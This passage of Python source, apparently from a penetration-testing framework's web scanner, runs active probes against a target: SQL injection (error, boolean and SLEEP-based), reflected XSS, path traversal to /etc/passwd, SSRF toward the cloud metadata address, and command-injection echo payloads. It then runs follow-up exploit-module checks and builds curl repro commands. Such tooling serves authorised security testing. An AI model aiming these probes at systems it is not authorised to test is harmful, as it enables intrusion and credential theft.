                    hits += self._probe_sqli(entry, param, baseline_resp, baseline_time)
                elif attack == "xss":
                    hits += self._probe_xss(entry, param)
                elif attack == "lfi":
                    hits += self._probe_lfi(entry, param)
                elif attack == "ssrf":
                    hits += self._probe_ssrf(entry, param)
                elif attack == "rce" and self.aggressive:
                    hits += self._probe_rce(entry, param)
        return hits

    def _should_probe_param(self, param: str) -> bool:
        name = param.lower()
        if name in SKIP_PARAM_KEYWORDS:
            return False
        if any(keyword in name for keyword in SKIP_PARAM_KEYWORDS):
            return False
        return True

    def _candidate_attacks(self, param: str, entry: Dict[str, Any]) -> List[str]:
        name = param.lower()
        attacks = []
        for attack, hints in ACTIVE_PARAM_HINTS.items():
            if any(name == hint or hint in name for hint in hints):
                attacks.append(attack)

        if not attacks:
            attacks.extend(["xss", "sqli"])

        if "xml" in entry["path"].lower() and "xxe" not in attacks:
            attacks.append("xxe")

        if "php" in self.tech_tokens and ("lfi" in attacks or "rce" in attacks):
            attacks.append("rce")

        deduped = []
        for attack in attacks:
            if attack not in deduped:
                deduped.append(attack)
        return deduped

    def _probe_sqli(self, entry: Dict[str, Any], param: str, baseline_resp, baseline_time: float) -> int:
        hits = 0
        original = entry["params"].get(param, "") or "1"
        error_payload = f"{original}'"
        error_resp, _ = self._send_entry_request(entry, self._mutated_params(entry, param, error_payload))
        if error_resp and self._contains_sqli_error(error_resp.text):
            hits += self._record_result(
                source="active",
                name="SQL Injection (error-based)",
                url=entry["url"],
                method=entry["method"],
                parameter=param,
                severity="high",
                confidence=92,
                evidence="Database error signature appeared after a quote-based payload",
                payload=error_payload,
                repro=self._build_repro_command(entry, param, error_payload),
                signal="sqli",
            )

        true_payload = f"{original} AND 1=1"
        false_payload = f"{original} AND 1=2"
        true_resp, _ = self._send_entry_request(entry, self._mutated_params(entry, param, true_payload))
        false_resp, _ = self._send_entry_request(entry, self._mutated_params(entry, param, false_payload))
        boolean_evidence = self._boolean_sqli_evidence(baseline_resp, true_resp, false_resp)
        if boolean_evidence:
            hits += self._record_result(
                source="active",
                name="SQL Injection (boolean-based)",
                url=entry["url"],
                method=entry["method"],
                parameter=param,
                severity="high",
                confidence=78,
                evidence=boolean_evidence,
                payload=false_payload,
                repro=self._build_repro_command(entry, param, false_payload),
                signal="sqli",
            )

        if self.aggressive and not self.waf_detected:
            time_payload = f"{original}' AND SLEEP(5)-- "
            _, elapsed = self._send_entry_request(
                entry,
                self._mutated_params(entry, param, time_payload),
                timeout=max(self.timeout + 5, 8),
            )
            if elapsed and elapsed >= max(baseline_time + 3.5, 4.8):
                hits += self._record_result(
                    source="active",
                    name="SQL Injection (time-based)",
                    url=entry["url"],
                    method=entry["method"],
                    parameter=param,
                    severity="high",
                    confidence=86,
                    evidence=f"Delayed response observed ({elapsed:.2f}s vs baseline {baseline_time:.2f}s)",
                    payload=time_payload,
                    repro=self._build_repro_command(entry, param, time_payload),
                    signal="sqli",
                )
        return hits

    def _probe_xss(self, entry: Dict[str, Any], param: str) -> int:
        marker = "KSPXSS"
        payload = f"{marker}<svg/onload=alert(1)>"
        response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
        if not response:
            return 0

        body = response.text or ""
        reflected = payload in body
        escaped = html.escape(payload) in body or payload.replace("<", "&lt;") in body
        if reflected and not escaped:
            return self._record_result(
                source="active",
                name="Reflected XSS",
                url=entry["url"],
                method=entry["method"],
                parameter=param,
                severity="high",
                confidence=88,
                evidence="Payload reflected in the response without HTML escaping",
                payload=payload,
                repro=self._build_repro_command(entry, param, payload),
                signal="xss",
            )
        return 0

    def _probe_lfi(self, entry: Dict[str, Any], param: str) -> int:
        payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
        ]
        for payload in payloads:
            response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
            if not response:
                continue
            evidence = self._lfi_evidence(response.text or "")
            if evidence:
                return self._record_result(
                    source="active",
                    name="Local File Inclusion",
                    url=entry["url"],
                    method=entry["method"],
                    parameter=param,
                    severity="high",
                    confidence=95,
                    evidence=evidence,
                    payload=payload,
                    repro=self._build_repro_command(entry, param, payload),
                    signal="lfi",
                )
        return 0

    def _probe_ssrf(self, entry: Dict[str, Any], param: str) -> int:
        payload = "http://169.254.169.254/latest/meta-data/"
        response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
        if not response:
            return 0

        body = (response.text or "").lower()
        indicators = [
            "instance-id",
            "ami-id",
            "meta-data",
            "security-credentials",
            "iam/info",
        ]
        error_indicators = [
            "connection refused",
            "econnrefused",
            "no route to host",
            "timed out",
            "dial tcp",
        ]

        if any(indicator in body for indicator in indicators):
            return self._record_result(
                source="active",
                name="Potential SSRF",
                url=entry["url"],
                method=entry["method"],
                parameter=param,
                severity="high",
                confidence=84,
                evidence="Response contains cloud metadata keywords after an internal URL probe",
                payload=payload,
                repro=self._build_repro_command(entry, param, payload),
                signal="ssrf",
            )

        if self.aggressive and any(indicator in body for indicator in error_indicators):
            return self._record_result(
                source="active",
                name="Potential SSRF",
                url=entry["url"],
                method=entry["method"],
                parameter=param,
                severity="medium",
                confidence=66,
                evidence="Backend-side connection error surfaced after an internal URL probe",
                payload=payload,
                repro=self._build_repro_command(entry, param, payload),
                signal="ssrf",
            )
        return 0

    def _probe_rce(self, entry: Dict[str, Any], param: str) -> int:
        marker = f"KSP_RCE_{int(time.time())}"
        payloads = [f";echo {marker}", f"&& echo {marker}", f"| echo {marker}"]
        for payload in payloads:
            response, _ = self._send_entry_request(entry, self._mutated_params(entry, param, payload))
            if response and marker in (response.text or ""):
                return self._record_result(
                    source="active",
                    name="Command Injection",
                    url=entry["url"],
                    method=entry["method"],
                    parameter=param,
                    severity="critical",
                    confidence=99,
                    evidence="Command marker echoed back in the server response",
                    payload=payload,
                    repro=self._build_repro_command(entry, param, payload),
                    signal="rce",
                )
        return 0

    def _send_entry_request(
        self,
        entry: Dict[str, Any],
        params: Dict[str, Any],
        timeout: Optional[int] = None,
    ) -> Tuple[Optional[Any], float]:
        try:
            started = time.monotonic()
            timeout = timeout or self.timeout
            if entry["method"] == "POST":
                response = self.session.post(
                    entry["url"],
                    data=params,
                    timeout=timeout,
                    allow_redirects=True,
                    verify=False,
                )
            else:
                response = self.session.get(
                    entry["url"],
                    params=params,
                    timeout=timeout,
                    allow_redirects=True,
                    verify=False,
                )
            return response, time.monotonic() - started
        except Exception as exc:
            self._verbose(f"Probe failed for {entry['url']} ({entry['method']}): {exc}")
            return None, 0.0

    def _mutated_params(self, entry: Dict[str, Any], param: str, payload: str) -> Dict[str, Any]:
        params = dict(entry["params"])
        params[param] = payload
        return params

    def _contains_sqli_error(self, text: str) -> bool:
        lowered = (text or "").lower()
        return any(error in lowered for error in SQLI_ERRORS)

    def _boolean_sqli_evidence(self, baseline_resp, true_resp, false_resp) -> str:
        if not baseline_resp or not true_resp or not false_resp:
            return ""

        baseline_len = len(baseline_resp.text or "")
        true_len = len(true_resp.text or "")
        false_len = len(false_resp.text or "")
        delta_true = abs(true_len - baseline_len)
        delta_false = abs(false_len - true_len)

        if (
            baseline_resp.status_code == true_resp.status_code
            and abs(false_resp.status_code - baseline_resp.status_code) <= 1
            and delta_true <= max(60, int(baseline_len * 0.08))
            and delta_false >= max(120, int(max(true_len, false_len) * 0.12))
        ):
            return (
                "Boolean response drift detected "
                f"(baseline={baseline_len}, true={true_len}, false={false_len})"
            )
        return ""

    def _lfi_evidence(self, text: str) -> str:
        lowered = (text or "").lower()
        if any(marker in lowered for marker in (marker.lower() for marker in LINUX_LFI_MARKERS)):
            return "Response looks like /etc/passwd content"
        if any(marker in lowered for marker in (marker.lower() for marker in WINDOWS_LFI_MARKERS)):
            return "Response looks like win.ini content"
        return ""

    def _select_followup_modules(self, module_patterns: List[str]) -> List[Dict[str, Any]]:
        if not self.framework or not hasattr(self.framework, "module_loader"):
            return []

        discovered = self.framework.module_loader.discover_modules()
        signals = {result["signal"] for result in self.results if result.get("signal")}
        patterns = [pattern.strip().lower() for pattern in module_patterns if pattern.strip()]
        candidates = []

        for mod_path in sorted(discovered.keys()):
            lower = mod_path.lower()
            if not self._is_http_followup_module(lower):
                continue
            if mod_path in self.passive_scanner_paths or mod_path in self.executed_modules:
                continue
            if "bruteforce" in lower:
                continue

            score = 0
            if mod_path in self.linked_modules:
                score += 120

            if not patterns or patterns == ["all"]:
                score += 5
            elif any(pattern in lower for pattern in patterns):
                score += 70
            elif mod_path not in self.linked_modules:
                continue

            for tech in self.tech_tokens:
                if tech in lower:
                    score += 25
            for signal in signals:
                if signal in lower:
                    score += 20

            if "http" in lower:
                score += 10

            if score >= 35:
                candidates.append({"path": mod_path, "score": score})

        candidates.sort(key=lambda item: item["score"], reverse=True)
        return candidates[: max(10, self.max_modules * 4)]

    def _is_http_followup_module(self, module_path: str) -> bool:
        prefixes = (
            "scanner/http/",
            "auxiliary/scanner/http/",
            "exploits/http/",
            "exploits/linux/http/",
            "exploits/multi/http/",
        )
        return module_path.startswith(prefixes)

    def _run_followup_checks(self, candidates: List[Dict[str, Any]]):
        with ThreadPoolExecutor(max_workers=min(self.threads, len(candidates) or 1)) as executor:
            futures = {
                executor.submit(self._run_followup_module, candidate["path"], candidate["score"]): candidate["path"]
                for candidate in candidates
            }
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as exc:
                    self._verbose(f"Follow-up check failed: {exc}")

    def _run_followup_module(self, mod_path: str, score: int):
        module = self._load_and_configure_http_module(mod_path)
        if not module:
            return

        result = None
        if hasattr(module, "check"):
            try:
                result = module.check()
            except Exception as exc:
                self._verbose(f"{mod_path}.check() failed: {exc}")
                return
        elif mod_path.startswith("scanner/http/") and hasattr(module, "run"):
            try:
                result = module.run()
            except Exception as exc:
                self._verbose(f"{mod_path}.run() failed: {exc}")
                return
        else:
            return

        positive, reason, confidence = self._module_result_details(module, result)
        if not positive:
            return

        info = getattr(module, "vulnerability_info", {}) or {}
        severity = self._normalize_severity(info.get("severity") or "info")
        if mod_path.startswith("exploits/") and severity == "info":
            severity = "high"
        self._record_result(
            source="followup",
            name=module.name or mod_path.split("/")[-1],
            module=mod_path,
            url=self.target_url,
            method="CHECK",
            severity=severity,
            confidence=confidence or min(95, 70 + min(score, 25)),
            evidence=reason or f"Follow-up module check positive (score={score})",
            metadata=info,
            signal=self._signal_from_path(mod_path),
        )

    def _load_and_configure_http_module(self, mod_path: str):
        if not self.framework or not hasattr(self.framework, "module_loader"):
            return None

        try:
            module = self.framework.module_loader.load_module(mod_path, framework=self.framework, silent=True)
        except TypeError:
            module = self.framework.module_loader.load_module(mod_path, framework=self.framework)
        if not module:
            return None

        self.executed_modules.add(mod_path)
        self._configure_http_module(module)
        return module

    def _configure_http_module(self, module):
        parsed = self.target_parts
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        ssl = parsed.scheme == "https"
        path = parsed.path or "/"

        self._set_module_candidates(module, ["target", "rhost", "rhosts", "RHOST", "RHOSTS"], host)
        self._set_module_candidates(module, ["port", "rport", "RPORT"], port)
        self._set_module_candidates(module, ["ssl", "SSL"], ssl)
        self._set_module_candidates(module, ["path", "PATH"], path)
        self._set_module_candidates(module, ["targeturi", "TARGETURI", "uri", "URI"], path)
        self._set_module_candidates(module, ["TARGET", "target_url", "base_url"], self.base_url)
        self._set_module_candidates(
            module,
            ["user_agent", "USER_AGENT"],
            self.session.headers.get("User-Agent", "Mozilla/5.0"),
        )
        self._set_module_candidates(module, ["timeout", "TIMEOUT"], self.timeout)
        self._set_module_candidates(module, ["verify_ssl", "VERIFY_SSL"], False)
        self._set_module_candidates(module, ["follow_redirects", "FOLLOW_REDIRECTS"], True)

        if hasattr(module, "_configure_session"):
            try:
                module._configure_session()
            except Exception:
                pass

        if hasattr(module, "session") and self.session:
            try:
                module.session.headers.update(self.session.headers)
                module.session.verify = False
                module.session.proxies = dict(getattr(self.session, "proxies", {}) or {})
            except Exception:
                pass

    def _set_module_candidates(self, module, options: List[str], value: Any):
        for option in options:
            if self._set_module_value(module, option, value):
                return

    def _set_module_value(self, module, option: str, value: Any) -> bool:
        if hasattr(module, "set_option") and module.set_option(option, value):
            return True
        if hasattr(module, option):
            try:
                attr = getattr(type(module), option, None)
                if attr is not None and hasattr(attr, "__set__"):
                    attr.__set__(module, value)
                else:
                    setattr(module, option, value)
                return True
            except Exception:
                return False
        return False

    def _module_result_details(self, module, result: Any) -> Tuple[bool, str, int]:
        if isinstance(result, dict):
            positive = bool(result.get("vulnerable", result.get("success", False)))
            reason = result.get("reason") or result.get("message") or ""
            confidence = self._normalize_confidence(result.get("confidence"))
            return positive, reason, confidence

        if isinstance(result, bool):
            info = getattr(module, "vulnerability_info", {}) or {}
            reason = info.get("reason") or ""
            severity = info.get("severity") or getattr(module, "__info__", {}).get("severity") or "info"
            return result, reason, self._default_confidence_for_severity(self._normalize_severity(severity))

        return bool(result), "", 0

    def _derive_tech_from_module(self, mod_path: str, evidence: str):
        lower = f"{mod_path} {evidence}".lower()
        for tech in [
            "wordpress",
            "joomla",
            "drupal",
            "django",
            "flask",
            "phpmyadmin",
            "grafana",
            "kibana",
            "tomcat",
            "jenkins",
            "graphql",
            "swagger",
            "apache",
            "nginx",
            "php",
        ]:
            if tech in lower:
                self._register_technology(tech, self.target_url)

    def _record_result(
        self,
        *,
        source: str,
        name: str,
        url: str,
        method: str,
        severity: str,
        confidence: int,
        evidence: str,
        parameter: str = "",
        payload: str = "",
        repro: str = "",
        module: str = "",
        metadata: Optional[Dict[str, Any]] = None,
        signal: str = "",
    ) -> int:
        severity = self._normalize_severity(severity)
        confidence = self._normalize_confidence(confidence)
        if confidence < self.min_confidence:
            return 0

        key = (
            name,
            url,
            method,
            parameter,
            (evidence or "").strip().lower()[:160],
            (payload or "")[:80],
        )
        with self.results_lock:
            if key in self.result_keys:
                return 0
            self.result_keys.add(key)
            result = {
                "source": source,
                "name": name,
                "module": module,
                "url": url,
                "method": method,
                "parameter": parameter,
                "severity": severity,
                "confidence": confidence,
                "evidence": evidence,
                "payload": payload,
                "repro": repro,
                "metadata": metadata or {},
                "signal": signal or self._signal_from_name(name),
                "timestamp": time.time(),
            }
            self.results.append(result)

        prefix = f"[{severity.upper()}]"
        if parameter:
            print_success(f"{prefix} {name} on {url} ({method} {parameter}, confidence={confidence}%)")
        else:
            print_success(f"{prefix} {name} on {url} (confidence={confidence}%)")
        return 1

    def _display_results(self):
        if not self.results:
            print_warning("No vulnerability reached the configured confidence threshold.")
            if self.followup_candidates:
                print_info("Suggested follow-up modules:")
                for candidate in self.followup_candidates[:8]:
                    print_info(f"  - {candidate['path']} (score={candidate['score']})")
            return

        ordered = sorted(
            self.results,
            key=lambda result: (
                -SEVERITY_ORDER.get(result["severity"], 0),
                -result["confidence"],
                result["name"],
                result["url"],
            ),
        )

        counts_by_severity = defaultdict(int)
        counts_by_source = defaultdict(int)
        for result in ordered:
            counts_by_severity[result["severity"]] += 1
            counts_by_source[result["source"]] += 1

        sev_summary = ", ".join(
            f"{severity}={counts_by_severity[severity]}"
            for severity in ["critical", "high", "medium", "low", "info"]
            if counts_by_severity[severity]
        )
        src_summary = ", ".join(f"{source}={count}" for source, count in sorted(counts_by_source.items()))
        print_success(f"Findings: {len(ordered)} | {sev_summary}")
        if src_summary:
            print_info(f"Sources: {src_summary}")

        for result in ordered[:20]:
            line = (
                f"[{result['severity'].upper()}] {result['name']} | {result['url']} "
                f"| method={result['method']} | confidence={result['confidence']}%"
            )
            if result.get("parameter"):
                line += f" | parameter={result['parameter']}"
            print_info(line)
            if result.get("module"):
                print_info(f"  module: {result['module']}")
            if result.get("evidence"):
                print_info(f"  evidence: {result['evidence']}")
            if result.get("payload"):
                print_info(f"  payload: {result['payload']}")
            if result.get("repro"):
                print_info(f"  repro: {result['repro']}")

        if len(ordered) > 20:
            print_info(f"... {len(ordered) - 20} additional findings omitted from console summary")

        if self.followup_candidates:
            print_info("Recommended follow-up modules:")
            for candidate in self.followup_candidates[:10]:
                print_info(f"  - {candidate['path']} (score={candidate['score']})")

    def _write_json_report(self, report_path: str):
        abs_path = os.path.abspath(report_path)
        directory = os.path.dirname(abs_path)
        if directory:
            os.makedirs(directory, exist_ok=True)

        report = {
            "target": self.target_url,
            "base_url": self.base_url,
            "started_at": self.scan_started_at,
            "finished_at": time.time(),
            "waf_detected": self.waf_detected,
            "technologies": {tech: sorted(urls) for tech, urls in sorted(self.technologies.items())},
            "crawled_urls": sorted(self.crawled_urls),
            "endpoints": [
                {
                    "url": entry["url"],
                    "path": entry["path"],
                    "method": entry["method"],
                    "params": entry["params"],
                    "has_params": entry["has_params"],
                    "interesting_score": entry["interesting_score"],
                    "source_pages": entry["source_pages"],
                    "discovered_from": entry["discovered_from"],
                }
                for entry in self.endpoint_inventory
            ],
            "results": self.results,
            "recommended_modules": self.followup_candidates,
        }

        with open(abs_path, "w", encoding="utf-8") as handle:
            json.dump(report, handle, indent=2, sort_keys=True)

    def _strip_query(self, url: str) -> str:
        parsed = urlparse(url)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))

    def _build_repro_command(self, entry: Dict[str, Any], param: str, payload: str) -> str:
        params = dict(entry["params"])
        params[param] = payload
        if entry["method"] == "POST":
            body = urlencode(params, doseq=True)
            return f"curl -isk -X POST --data '{body}' '{entry['url']}'"
        query = urlencode(params, doseq=True)
        return f"curl -isk '{entry['url']}?{query}'"

    def _normalize_severity(self, severity: Any) -> str:
        normalized = str(severity or "info").strip().lower()
        if normalized not in SEVERITY_ORDER:
            return "info"
        return normalized

    def _default_confidence_for_severity(self, severity: str) -> int:
        return {
            "critical": 98,
            "high": 88,
            "medium": 80,
            "low": 74,
            "info": 70,
        }.get(self._normalize_severity(severity), 60)

    def _normalize_confidence(self, confidence: Any) -> int:
        if isinstance(confidence, str):
            mapping = {"low": 60, "medium": 78, "high": 92}
            if confidence.lower() in mapping:
                return mapping[confidence.lower()]
            try:
                confidence = int(confidence)
            except ValueError:
                return 0
        if isinstance(confidence, (int, float)):
            return max(0, min(100, int(confidence)))
        return 0

    def _signal_from_name(self, name: str) -> str:
        lowered = (name or "").lower()
        for signal in ["rce", "sqli", "sql", "xss", "lfi", "ssrf", "xxe", "wordpress", "joomla", "drupal"]:
            if signal in lowered:
                return signal.replace("sql", "sqli") if signal == "sql" else signal
        return ""

    def _signal_from_path(self, path: str) -> str:
        lowered = (path or "").lower()
        for signal in [
            "wordpress",
            "joomla",
            "drupal",
            "django",
            "flask",
            "tomcat",
            "phpmyadmin",
            "grafana",
            "kibana",
            "graphql",
            "swagger",
            "sqli",
            "xss",
            "lfi",
            "ssrf",
            "xxe",
            "rce",
        ]:
            if signal in lowered:
                return signal
        return ""

    def _verbose(self, message: str):
        if self.verbose:
            print_info(message)
